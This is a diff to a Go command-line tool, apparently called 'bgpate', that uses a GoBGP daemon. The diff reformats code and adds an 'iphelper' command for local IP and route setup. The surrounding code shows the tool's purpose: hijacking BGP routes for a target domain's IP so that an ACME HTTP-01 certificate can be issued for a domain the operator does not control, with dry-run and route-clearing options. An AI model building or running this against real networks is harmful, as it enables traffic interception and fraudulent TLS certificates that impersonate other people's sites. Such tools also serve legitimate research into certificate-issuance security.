@@ -11,18 +11,20 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 	"time"
 
-	api "github.com/osrg/gobgp/v3/api"
 	"bgpate/pkg/ripe"
 	"bgpate/pkg/utils"
+
 	"github.com/go-acme/lego/v4/certcrypto"
 	"github.com/go-acme/lego/v4/certificate"
 	"github.com/go-acme/lego/v4/challenge/http01"
 	"github.com/go-acme/lego/v4/lego"
 	"github.com/go-acme/lego/v4/registration"
+	api "github.com/osrg/gobgp/v3/api"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"google.golang.org/protobuf/types/known/anypb"
@@ -33,9 +35,11 @@ const (
 )
 
 type Config struct {
-	Community string `json:"community"`
-	Time      int    `json:"time"` // Time in seconds to wait after hijacking
-	TimeBeforeGeneratingCertificate int    `json:"timeBeforeGeneratingCertificate"` // Time in seconds to wait before generating certificate
+	Community                       string   `json:"community"`
+	Time                            int      `json:"time"`                            // Time in seconds to wait after hijacking
+	TimeBeforeGeneratingCertificate int      `json:"timeBeforeGeneratingCertificate"` // Time in seconds to wait before generating certificate
+	IphelperDst                     []string `json:"iphelperDst"`                     // List of destination IPs for iphelper command
+	IphelperGateway                 string   `json:"iphelperGateway"`                 // Gateway IP for iphelper command
 }
 
 var config Config
@@ -77,7 +81,7 @@ func createCommunityAttributes() ([]*anypb.Any, error) {
 
 	// Split the community value into parts
 	parts := strings.Split(config.Community, ":")
-	
+
 	// Check if it starts with "large:" prefix
 	if len(parts) > 0 && parts[0] == "large" {
 		// Remove the "large:" prefix and process as large community
@@ -292,7 +296,7 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 	// hijackRoutes(client, ctx, "192.168.1.0", false)
 	// Using a specific prefix length
 	// hijackRoutes(client, ctx, "192.168.1.0", false, 16)
-	
+
 	// Get BGP neighbors
 	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
 	if err != nil {
@@ -329,7 +333,7 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 		}
 
 		if dryrun {
-			fmt.Printf("[DRYRUN] Would add route %s with origin %d\n", 
+			fmt.Printf("[DRYRUN] Would add route %s with origin %d\n",
 				np, asn)
 			continue
 		}
@@ -340,7 +344,7 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
 
-		fmt.Printf("Route added successfully to %s (%s)\n", 
+		fmt.Printf("Route added successfully to %s (%s)\n",
 			peer.Peer.Conf.NeighborAddress, np)
 	}
 
@@ -428,13 +432,13 @@ func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Contex
 	fmt.Printf("Resolved domain: %s to IPs: %v\n", domain, ips)
 	if len(ips) > 1 {
 		return fmt.Errorf("multiple IPs found for domain: %s", domain)
-	} 
+	}
 	ip := ips[0]
 	// hijack routes
 	if err := hijackRoutes(client, ctx, ip.String(), dryrun); err != nil {
 		return fmt.Errorf("failed to hijack routes: %v", err)
 	}
-	
+
 	// Wait for the configured time before generating certificate
 	if config.TimeBeforeGeneratingCertificate > 0 {
 		fmt.Printf("[INFO] Waiting for %d seconds before generating certificate...\n", config.TimeBeforeGeneratingCertificate)
@@ -463,8 +467,30 @@ func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Contex
 		return fmt.Errorf("failed to clear routes: %v", err)
 	}
 	fmt.Println("Hijacked successfully")
-	
+
 	return nil
+}
+
+func getDefaultGateway(interfaceName string) (string, error) {
+	cmd := exec.Command("ip", "route", "show", "dev", interfaceName)
+	output, err := cmd.Output()
+	if err != nil {
+		return "", fmt.Errorf("failed to get routes for interface %s: %v", interfaceName, err)
+	}
+
+	// Parse the output to find the default gateway
+	lines := strings.Split(string(output), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "default via") {
+			fields := strings.Fields(line)
+			for i, field := range fields {
+				if field == "via" && i+1 < len(fields) {
+					return fields[i+1], nil
+				}
+			}
+		}
+	}
+	return "", fmt.Errorf("no default gateway found for interface %s", interfaceName)
 }
 
 func main() {
@@ -474,7 +500,7 @@ func main() {
 	}
 
 	if len(os.Args) < 2 {
-		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> [--dryrun] - Generate certificate for specified domain")
+		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> [--dryrun] - Generate certificate for specified domain\n  iphelper <ip> <interface> [-d] - Add or remove IP helper route")
 	}
 
 	// Connect to GoBGP daemon
@@ -528,7 +554,55 @@ func main() {
 			log.Fatalf("Failed to generate certificate: %v", err)
 		}
 
+	case "iphelper":
+		if len(os.Args) < 4 {
+			log.Fatal("Usage: go run main.go iphelper <ip> <interface> [-d]")
+		}
+		ip := os.Args[2]
+		interfaceName := os.Args[3]
+		isDelete := len(os.Args) > 4 && os.Args[4] == "-d"
+
+		if isDelete {
+			// execute ip addr del <ip>/32 dev <interface>
+			cmd := exec.Command("ip", "addr", "del", ip+"/32", "dev", interfaceName)
+			cmd.Stdout = os.Stdout
+			cmd.Stderr = os.Stderr
+			if err := cmd.Run(); err != nil {
+				log.Fatalf("Failed to execute ip addr del: %v", err)
+			}
+		} else {
+			// Get the gateway - use config if specified, otherwise get from interface
+			var gateway string
+			var err error
+			if config.IphelperGateway != "" {
+				gateway = config.IphelperGateway
+			} else {
+				gateway, err = getDefaultGateway(interfaceName)
+				if err != nil {
+					log.Fatalf("Failed to get default gateway: %v", err)
+				}
+			}
+
+			// execute ip addr add <ip>/32 dev <interface>
+			cmd := exec.Command("ip", "addr", "add", ip+"/32", "dev", interfaceName)
+			cmd.Stdout = os.Stdout
+			cmd.Stderr = os.Stderr
+			if err := cmd.Run(); err != nil {
+				log.Fatalf("Failed to execute ip addr add: %v", err)
+			}
+
+			// Add routes for each destination IP from config
+			for _, dstIP := range config.IphelperDst {
+				cmd = exec.Command("ip", "route", "add", dstIP+"/32", "via", gateway, "src", ip)
+				cmd.Stdout = os.Stdout
+				cmd.Stderr = os.Stderr
+				if err := cmd.Run(); err != nil {
+					log.Fatalf("Failed to execute ip route add for %s: %v", dstIP, err)
+				}
+			}
+		}
+
 	default:
-		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain> [--dryrun]")
+		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain> [--dryrun], iphelper <ip> <interface> [-d]")
 	}
-} 
+}
